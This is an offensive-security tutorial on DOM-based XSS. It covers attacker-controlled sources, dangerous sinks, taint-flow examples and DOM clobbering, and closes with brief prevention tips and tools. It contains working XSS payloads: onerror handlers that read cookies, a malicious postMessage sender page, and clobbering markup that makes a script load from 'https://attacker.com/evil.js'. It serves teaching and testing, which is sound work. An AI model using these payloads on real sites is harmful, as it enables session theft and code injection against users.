# 02 — DOM-Based XSS: Sources, Sinks & Taint Analysis

## Overview

DOM XSS executes entirely in the browser. The server never sees the payload, making it invisible to server-side WAFs and logging. Exploiting it requires understanding source-to-sink data flow, DOM API semantics, and browser parsing quirks.

---

## 1. Sources (Attacker-Controlled Data Entry Points)

| Source | Description | Notes |
|--------|-------------|-------|
| `location.hash` | URL fragment — never sent to server | Common in SPAs |
| `location.search` | Query string | Reflected but processed client-side |
| `location.pathname` | URL path | Parsed by JS routers |
| `document.referrer` | Referring URL | Controlled by attacker via crafted page |
| `window.name` | Persists across same-origin navigations | **Note:** Chrome 88+ resets `window.name` on cross-origin navigation — this vector is significantly limited in modern browsers |
| `postMessage` | Cross-origin messaging | Origin check often missing |
| `localStorage/sessionStorage` | Persistent attacker data | Injected via prior XSS |
| `document.cookie` | Cookie values | If attacker can set subdomain cookies |

---

## 2. Sinks (Dangerous Execution Points)

### HTML Sinks

```javascript
element.innerHTML = userInput;                    // Executes HTML
element.outerHTML = userInput;                    // Replaces element with parsed HTML
document.write(userInput);                        // Rewrites entire document
document.writeln(userInput);
element.insertAdjacentHTML('beforeend', userInput);
```

### JavaScript Execution Sinks

```javascript
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);         // String form only — arrow function form is safe
setInterval(userInput, 1000);        // String form only
```

### Navigation Sinks

```javascript
location.href = userInput;           // Executes javascript: protocol
location.assign(userInput);
location.replace(userInput);
window.open(userInput);
```

### Resource Loading Sinks

```javascript
element.src = userInput;             // <script src>, <img src>, etc.
element.setAttribute('href', userInput);
scriptElement.src = userInput;
```

---

## 3. Taint Flow Examples

### Example 1: Hash to innerHTML

```javascript
// Vulnerable code
document.getElementById('result').innerHTML = decodeURIComponent(location.hash.slice(1));

// Exploit URL
// https://victim.com/page#<img src=x onerror=alert(origin)>
```

### Example 2: postMessage without Origin Check

```javascript
// Vulnerable receiver
window.addEventListener('message', function(e) {
  // Missing: if (e.origin !== 'https://trusted.com') return;
  document.getElementById('output').innerHTML = e.data;
});
```

```javascript
// Attacker page
const target = window.open('https://victim.com');
setTimeout(() => {
  target.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
}, 2000);
```

### Example 3: window.name Persistence

```javascript
// Attacker sets window.name before navigating
window.name = '<img src=x onerror=alert(1)>';
location = 'https://victim.com/page-that-uses-window.name';

// Victim page sink
document.write(window.name);
```

> **Browser behavior note:** Chrome 88+ resets `window.name` to an empty string when navigating cross-origin. This breaks the classic `window.name` transport vector on modern browsers. The technique still works in same-origin navigation scenarios and in some older browsers. Test your target's browser distribution before relying on this source.

---

## 4. DOM Clobbering

DOM Clobbering allows attackers to overwrite JavaScript globals or object properties using HTML elements whose `id` or `name` attributes match the target variable name. No script injection is required — only HTML injection.

### Basic Clobbering

```html
<!-- If JS does: if (config.debug) { eval(config.debugScript); } -->

<!-- Attacker injects: -->
<form id="config"><input name="debugScript" value="alert(1)"></form>

<!-- config now resolves to the <form> element, config.debugScript to the <input> -->
```

### document.getElementById Clobbering

`document.getElementById` is not directly clobberable, but named form elements are accessible via `window['id']` and `document['id']`. The patterns that matter:

```html
<!-- Any property access on window falls back to named elements -->
<!-- window.foo resolves to document.getElementById('foo') if no JS var exists -->

<a id="target" href="https://attacker.com">link</a>
<!-- If code does: location.href = target.href  → redirected to attacker.com -->
```

```html
<!-- Clobber a security check variable -->
<a id="isAdmin">
<!-- JS code: if (!isAdmin) { throw new Error(); } -->
<!-- isAdmin is now truthy (it's an HTMLElement) -->
```

### HTMLCollection Clobbering

When two elements share the same `id` or `name`, the browser creates an `HTMLCollection`:

```html
<a id="x"><a id="x" href="javascript:alert(1)">

<!-- JS: document.getElementById('x') returns the first element
     But window.x returns an HTMLCollection
     window.x[1].href === "javascript:alert(1)" -->
```

This technique is used to reach deeply nested properties through chained clobbering:

```html
<!-- Target: window.config.transport.url being set to script src -->
<form id="config" name="config">
  <input id="transport" name="transport">
</form>
<!-- window.config → HTMLFormElement
     window.config.transport → HTMLInputElement
     window.config.transport.url → undefined (does not clobber .url directly) -->
```

For deeper chains, use `<object>` with nested elements, or exploit `HTMLFormElement`'s named access to form controls:

```html
<form id="config"><input name="url" value="https://attacker.com/evil.js"></form>
<!-- config.url.toString() === "https://attacker.com/evil.js"
     If code does: script.src = config.url  → loads attacker script -->
```

### Prevention

- Avoid accessing DOM element properties as if they were JS objects; use explicit null checks with `instanceof`.
- Use `Object.create(null)` for configuration objects rather than relying on global property lookup.
- Apply a strict CSP `script-src` to limit what scripts can execute even if DOM Clobbering succeeds.

---

## 5. Tools for DOM XSS

- **DOM Invader** (Burp Suite) — visual taint tracing, source/sink mapping, prototype pollution detection
- **Playwright + custom hooks** — headless browser testing with `page.evaluate()` and dialog interception
- **retire.js** — identify vulnerable JS libraries in use

---

## References

- [PortSwigger DOM XSS](https://portswigger.net/web-security/dom-based)
- [DOM Clobbering Strikes Back — Gareth Heyes](https://portswigger.net/research/dom-clobbering-strikes-back)
- [Chrome 88 window.name Change](https://developer.chrome.com/blog/privacy-sandbox-showroom/)
- [DOM Clobbering — PortSwigger Research](https://portswigger.net/web-security/dom-based/dom-clobbering)
